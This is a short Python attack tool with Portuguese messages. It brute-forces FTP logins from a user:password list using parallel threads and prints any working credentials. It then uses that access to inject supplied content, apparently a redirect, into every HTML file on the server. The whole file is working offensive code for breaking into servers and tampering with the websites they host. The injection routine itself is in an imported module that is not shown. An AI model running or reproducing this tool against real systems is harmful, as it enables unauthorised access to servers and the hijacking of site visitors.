from threading import Thread
from ftpClient import FTPClient


class FTPInject:
    def __init__(self, host):
        self.host = host
        self._client: FTPClient = None
        
    def connect_ftp_client(self, user, password):
        try:
            ftp = FTPClient(self.host, user, password)
            if ftp.connect_ftp():
                self._client = ftp
        except Exception as e:
            pass

    def brute_force(self, arquivo_senhas, redirecionar):
        arq_sen = open(arquivo_senhas, 'r')
        
        threads = []
        for linha in arq_sen.readlines():
            
            usuario = linha.split(':')[0]
            senha = linha.split(':')[1].strip('\r').strip('\n')

            t = Thread(target=self.connect_ftp_client, args=(usuario, senha))
            t.start()
            threads.append(t)

        [t.join() for t in threads]

        if self._client is None:
            print('\n[-] Não foi possível descobrir as credenciais FTP.')
            return (None, None)
        else:
            print('\n[+] Credenciais FTP encontradas: ' + self._client.user + ":" + self._client.password)
            return (self._client.user, self._client.password)


    def pages_patterns(self, content):
        web_files = ['html']
        files = self._client.get_files()
        for file in files:
            if file.split('.')[-1] in web_files:
                print(file)
                self._client.paginaInject(file, content)
    
    def start(self, arquivo, redirecionar):
        self.brute_force(arquivo, redirecionar)

        if self._client:
            print("opa")
            self.pages_patterns(redirecionar)